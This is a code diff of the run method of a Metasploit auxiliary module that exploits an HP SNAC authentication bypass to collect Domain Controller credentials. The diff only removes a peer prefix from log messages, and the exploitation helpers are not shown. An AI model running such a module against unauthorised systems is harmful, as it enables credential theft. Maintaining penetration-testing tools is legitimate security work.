@@ -118,27 +118,27 @@ class Metasploit3 < Msf::Auxiliary
 
   def run
 
-    print_status("#{peer} - Get Domain Info")
+    print_status("Get Domain Info")
     session = get_session
 
     if session.nil?
-      print_error("#{peer} - Failed to get a valid session, maybe the target isn't HP SNAC installation?")
+      print_error("Failed to get a valid session, maybe the target isn't HP SNAC installation?")
       return
     end
 
-    print_status("#{peer} - Exploiting Authentication Bypass to gather Domain Controller Info...")
+    print_status("Exploiting Authentication Bypass to gather Domain Controller Info...")
     domain_info = get_domain_info(session)
 
     if domain_info.nil?
-      print_error("#{peer} - Failed, maybe the target isn't vulnerable")
+      print_error("Failed, maybe the target isn't vulnerable")
       return
     end
 
-    print_status("#{peer} - Parsing data gathered...")
+    print_status("Parsing data gathered...")
     credentials = parse_domain_data(domain_info)
 
     if credentials.empty?
-      print_warning("#{peer} - Any Domain Controller has been found...")
+      print_warning("Any Domain Controller has been found...")
       return
     end
 
